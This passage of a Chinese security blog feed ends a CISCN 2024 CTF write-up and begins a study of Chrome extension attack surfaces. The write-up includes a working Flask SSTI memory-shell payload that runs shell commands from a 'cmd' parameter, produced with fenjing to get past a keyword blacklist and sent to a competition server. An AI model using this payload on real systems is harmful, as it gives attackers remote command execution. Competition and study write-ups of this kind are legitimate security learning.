punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> request_data<span class="token punctuation">:</span>                client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span>            <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> proxy_socket<span class="token punctuation">:</span>                proxy_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>                proxy_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request_data<span class="token punctuation">)</span>                response_data <span class="token operator">=</span> <span class="token string">b""</span>                <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                    chunk <span class="token operator">=</span> proxy_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token keyword">not</span> chunk<span class="token punctuation">:</span>                        <span class="token keyword">break</span>                    response_data <span class="token operator">+=</span> chunk            header_end <span class="token operator">=</span> response_data<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">b"\r\n\r\n"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> header_end <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> response_data<span class="token punctuation">[</span>header_end <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> response_data                            response_body <span class="token operator">=</span> body            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 200 OK\r\n"</span> \                       <span class="token string">b"Content-Length: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>response_body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\r\n"</span> \                       <span class="token string">b"Content-Type: text/html; charset=utf-8\r\n"</span> \                       <span class="token string">b"\r\n"</span> <span class="token operator">+</span> response_body            client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">finally</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start_proxy_server</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>    proxy_handler <span class="token operator">=</span> HTTPProxyHandler<span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span>    server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy server is running on </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string"> and forwarding to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_port<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connection from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>proxy_handler<span class="token punctuation">.</span>handle_request<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shutting down proxy server..."</span><span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_flask_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    proxy_host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>    proxy_port <span class="token operator">=</span> <span class="token number">5001</span>    target_host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>    target_port <span class="token operator">=</span> <span class="token number">5000</span>    <span class="token comment"># 安全反代，防止针对响应头的攻击</span>    proxy_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>start_proxy_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>proxy_host<span class="token punctuation">,</span> proxy_port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>    proxy_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    proxy_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Starting Flask app..."</span><span class="token punctuation">)</span>    run_flask_app<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼打ssti，ban 了响应头</p><p>打内存马在响应体里就行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> fenjing<span class="token keyword">import</span> logging<span class="token keyword">import</span> requestslogging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""[    app.view_functions    for app in [ __import__('sys').modules["__main__"].app ]    for request in [ __import__('sys').modules["__main__"].request ]    if [        app.__dict__.update(&#123;'_got_first_request':False&#125;),        app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)    ]]"""</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">'\\'</span> <span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">all</span><span class="token punctuation">(</span>word <span class="token keyword">not</span> <span class="token keyword">in</span> s <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span>full_payload_gen <span class="token operator">=</span> fenjing<span class="token punctuation">.</span>FullPayloadGen<span class="token punctuation">(</span>waf<span class="token punctuation">)</span>payload<span class="token punctuation">,</span> will_print <span class="token operator">=</span> full_payload_gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>    fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>EVAL<span class="token punctuation">,</span> <span class="token punctuation">(</span>fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>STRING<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> will_print<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"这个payload不会产生回显"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    <span class="token string">"http://47.93.212.188:32936"</span><span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215100840684.png" alt="image-20241215100840684"></p><hr><h1 id="sxweb1（Unsolved）"><a href="#sxweb1（Unsolved）" class="headerlink" title="sxweb1（Unsolved）"></a>sxweb1（Unsolved）</h1><p>Apache&#x2F;2.4.58</p><p>直接访问 publishers.php，返回<code>more lines returned. maybe SQL injection Attack</code></p><hr><h1 id="easyweb（Unsolved）"><a href="#easyweb（Unsolved）" class="headerlink" title="easyweb（Unsolved）"></a>easyweb（Unsolved）</h1><p>进去403，开扫</p><p>有一个上传文件的接口和一个下载文件的接口</p><p>下载文件限制后缀为 .txt 和 .zip</p><p>上传文件限制后缀为图片且无回显路径</p><hr><h1 id="sxweb2（Unsolved）"><a href="#sxweb2（Unsolved）" class="headerlink" title="sxweb2（Unsolved）"></a>sxweb2（Unsolved）</h1><p>看起来像是 1 的进阶版，实际上 1 还是0解</p><p>进去发现路径直接在 &#x2F;cgi-bin&#x2F;index.py 了</p><p>单独访问 &#x2F;cgi-bin&#x2F; 得到</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/    html/        index.html        apache.jpg    db/        pubs.db    cgi-bin/        local/            flag.py        index.cgi        authors.py        index.py        wget.py        update_authorsform.py        updateauthor.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是直接访问 &#x2F;cgi-bin&#x2F;local&#x2F;flag.py 会返回403</p><p>尝试通过 wget.py 访问 127.0.0.1&#x2F;cgi-bin&#x2F;local&#x2F;flag.py ，返回 Notice: local access is not allowed</p><p>&#x2F;bin&#x2F;authors.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210603673.png" alt="image-20241215210603673"></p><p>&#x2F;cgi-bin&#x2F;update_authorsform.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210619778.png" alt="image-20241215210619778"></p><p>&#x2F;cgi-bin&#x2F;updateauthor.py</p><p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210707260.png" alt="image-20241215210707260"></p><hr><h1 id="BookManager（Unsolved）"><a href="#BookManager（Unsolved）" class="headerlink" title="BookManager（Unsolved）"></a>BookManager（Unsolved）</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一觉醒来NISA实力下降一万倍，哈哈两人退役之后我们完蛋了&lt;/p&gt;
&lt;p&gt;这b web真是一天比一天难打了，梭哈半天拿不下少解题，其他题回头就被打烂&lt;/p&gt;
&lt;p&gt;学web救不了NISA，唉我好菜啊😭&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/16750&quot;&gt;https://xz.aliyun.com/t/16750&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/16792&quot;&gt;https://xz.aliyun.com/t/16792&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>Chrome扩展攻击</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/15/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/15/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</id>
    <published>2024-12-14T16:51:25.000Z</published>
    <updated>2024-12-25T02:37:28.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前打 GeekGame 的时候就遇到过利用 chrome 扩展进行 xss 的题，正好看到有相关的文章，遂学习一下</p><p>参考：</p><p><a href="https://blog.xlab.app/p/4db211d1/">https://blog.xlab.app/p/4db211d1/</a></p><p><a href="https://blog.xlab.app/p/4db211d2/">https://blog.xlab.app/p/4db211d2/</a></p><span id="more"></span><hr><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h2><p>edge 的扩展位置在 <code>%localappdata%\Microsoft\Edge\User Data\Default\Extensions</code></p><p>接下来以 GeekGame2024 里 web-crx 更新后的扩展文件 bxx 为例子来熟悉组件</p><h2 id="manifest-json"><a href="#manifest-json" class="headerlink" title="manifest.json"></a>manifest.json</h2><p>官方文档：<a href="https://developer.chrome.google.cn/docs/extensions/reference/manifest?hl=zh-cn">https://developer.chrome.google.cn/docs/extensions/reference/manifest?hl=zh-cn</a></p><p>扩展程序的配置清单，放在扩展程序代码的根目录，包含以下内容：</p><ol><li><p>名称，描述，版本等</p><p>最小清单：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"manifest_version"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Minimal Manifest"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"A basic example extension with only required keys"</span><span class="token punctuation">,</span>  <span class="token property">"icons"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"48"</span><span class="token operator">:</span> <span class="token string">"images/icon-48.png"</span><span class="token punctuation">,</span>    <span class="token property">"128"</span><span class="token operator">:</span> <span class="token string">"images/icon-128.png"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>API权限定义，如 读写书签&#x2F;历史&#x2F;Cookie 等 Chrome API</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"tabs"</span><span class="token punctuation">,</span> <span class="token string">"scripting"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>网站权限定义，允许无视同源策略访问哪些网站</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"host_permissions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"&lt;all_urls>"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>定义<code>Content scripts</code>是哪些 js，在哪里何时运行等</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"content_scripts"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"matches"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"*://*/*"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"js"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"contentScript.bundle.js"</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>定义<code>Background scripts</code>是哪些 js</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"background"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"service_worker"</span><span class="token operator">:</span> <span class="token string">"background.bundle.js"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>CSP</code>策略…</p></li></ol><hr><h2 id="Content-scripts"><a href="#Content-scripts" class="headerlink" title="Content scripts"></a>Content scripts</h2><p><a href="https://developer.chrome.google.cn/docs/extensions/reference/manifest/content-scripts?hl=zh-cn">https://developer.chrome.google.cn/docs/extensions/reference/manifest/content-scripts?hl=zh-cn</a></p><p>在每个标签页中运行，每个扩展<strong>一个隔离环境</strong>，有独立的<code>JavaScript</code>变量，<code>CSP</code>策略等，同时拥有一部分Chrome API功能，<strong>只与网页中的JS使用同一个<code>DOM</code></strong></p><p>一般用来处理与网页<code>DOM</code>相关的功能，或与<code>Background scripts</code>通信交互完成相关功能</p><p>同源策略与所在的标签页相同</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"content_scripts"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"matches"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"*://*/*"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"js"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"contentScript.bundle.js"</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>matches：将内容脚本注入到的网址格式，这里匹配所有的网址</li><li>js：注入网页的 js 脚本</li></ul><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218194441943.png" alt="image-20241218194441943"></p><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218194514408.png" alt="image-20241218194514408"></p><hr><h3 id="Inject-scripts"><a href="#Inject-scripts" class="headerlink" title="Inject scripts"></a>Inject scripts</h3><p>由于<code>Content scripts</code>与网页隔离，有些功能又需要访问网页空间中的数据</p><p>那么扩展程序往往会在<code>Content scripts</code>中通过<code>DOM</code>注入各种标签，当然也包括<code>script</code></p><p>这里是在 contentScript.bundle.js 里面进行插入的</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> style <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>style<span class="token punctuation">.</span>textContent <span class="token operator">=</span> styles<span class="token punctuation">;</span>document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>style<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果插入的是 script 标签便会引入一些攻击面</p><hr><h2 id="Background-scripts"><a href="#Background-scripts" class="headerlink" title="Background scripts"></a>Background scripts</h2><p>扩展程序的后台服务，拥有完整的Chrome API功能，但不能直接访问<code>DOM</code></p><p>一般用于持续运行的功能，或依赖相关Chrome API的功能</p><p>在一定的权限设定下，无同源策略限制</p><p>在Manifest V2中是一个HTML，叫<code>background.html</code>，如果是JS的话会自动生成一个HTML</p><p>在Manifest V3中是一个JS，叫<code>Service Worker</code></p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"background"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"service_worker"</span><span class="token operator">:</span> <span class="token string">"background.bundle.js"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218194904970.png" alt="image-20241218194904970"></p><p>background.bundle.js 里对应的代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">chrome<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>onInstalled<span class="token punctuation">.</span><span class="token function">addListener</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token string">"install"</span><span class="token operator">===</span>t<span class="token punctuation">.</span>reason <span class="token operator">&amp;&amp;</span> chrome<span class="token punctuation">.</span>tabs<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"chrome://newtab"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>监听安装行为，在安装此扩展时在浏览器打开一个新标签页</p><hr><h3 id="Popup"><a href="#Popup" class="headerlink" title="Popup"></a>Popup</h3><p>定义的位置在 action 的 default_popup</p><p>是点击扩展图标后弹出的页面，权限与<code>Background</code>组件相同</p><p>以 沉浸式翻译 为例子：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"action"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"default_icon"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"128"</span><span class="token operator">:</span> <span class="token string">"icons/128.png"</span><span class="token punctuation">,</span>        <span class="token property">"256"</span><span class="token operator">:</span> <span class="token string">"icons/256.png"</span><span class="token punctuation">,</span>        <span class="token property">"32"</span><span class="token operator">:</span> <span class="token string">"icons/32.png"</span><span class="token punctuation">,</span>        <span class="token property">"48"</span><span class="token operator">:</span> <span class="token string">"icons/48.png"</span><span class="token punctuation">,</span>        <span class="token property">"64"</span><span class="token operator">:</span> <span class="token string">"icons/64.png"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"default_popup"</span><span class="token operator">:</span> <span class="token string">"popup.html"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218195819564.png" alt="image-20241218195819564"></p><h3 id="options-page"><a href="#options-page" class="headerlink" title="options_page"></a>options_page</h3><p>为扩展的选项页，权限与<code>Background</code>组件相同</p><hr><h2 id="通信架构"><a href="#通信架构" class="headerlink" title="通信架构"></a>通信架构</h2><p><img src="/blog/Chrome%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/image-20241218200053198.png" alt="image-20241218200053198"></p><p>Webpage 是指网页 Javascript 的空间，与 Content 共享 DOM，其中 window 比较特殊，虽然是共用一个 window，但有变量隔离</p><p>由于共用 window ，Webpage 与 Content 可以使用<code>window.postMessage</code>进行通信</p><p>当 Content 调用<code>chrome.runtime.sendMessage</code>时其实在向所有 Background 页面中广播</p><p>同理，Background 页面之间使用<code>chrome.runtime.sendMessage</code>发送消息时也相当于在广播</p><hr><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>前端漏洞主要还是围绕 XSS 和 CSRF</p><p>而 Chrome Manifest V3 中规定禁止代码执行，禁止加载远程资源，体现在CSP中无法添加<code>unsafe-eval</code>和<code>unsafe-inline</code>，也无法添加任何远程地址，导致想要在 Manifest V3 实现 XSS 非常困难</p><h2 id="Content-scripts-1"><a href="#Content-scripts-1" class="headerlink" title="Content scripts"></a>Content scripts</h2><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>由于 Content scripts 与网页 JS 共享<code>DOM</code></p><p>对于攻击者来说，攻击入口包括整个 DOM</p><h3 id="DOM-Event"><a href="#DOM-Event" class="headerlink" title="DOM  Event"></a>DOM  Event</h3><p>除了<code>Content</code>去直接查询<code>DOM</code>元素，还有订阅事件</p><h3 id="onmessage"><a href="#onmessage" class="headerlink" title="onmessage"></a>onmessage</h3><p>由于<code>Content scripts</code>与网页使用同一个<code>window</code>，<code>postMessage</code>将直接与<code>Content scripts</code>通信</p><p>如果没有校验来源，甚至可以利用 iframe 或者 window.open 获取目标window，跨域发送消息直达<code>Content scripts</code>完成攻击</p><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><p>虽然说<code>Content</code>与网页隔离，变量不能共享，但是<code>window.name</code>是个例外</p><h3 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h3><p>如果在<code>Content</code>中使用Web Storage，其实是在使用当前网站的存储，而不是扩展程序自己的</p><p>写入Web Storage存在信息泄露，同时读取Web Storage也是用户输入</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前打 GeekGame 的时候就遇到过利用 chrome 扩展进行 xss 的题，正好看到有相关的文章，遂学习一下&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.xlab.app/p/4db211d1/&quot;&gt;https://blog.xlab.app/p/4db211d1/&lt;/a&gt;&lt;/p&gt;
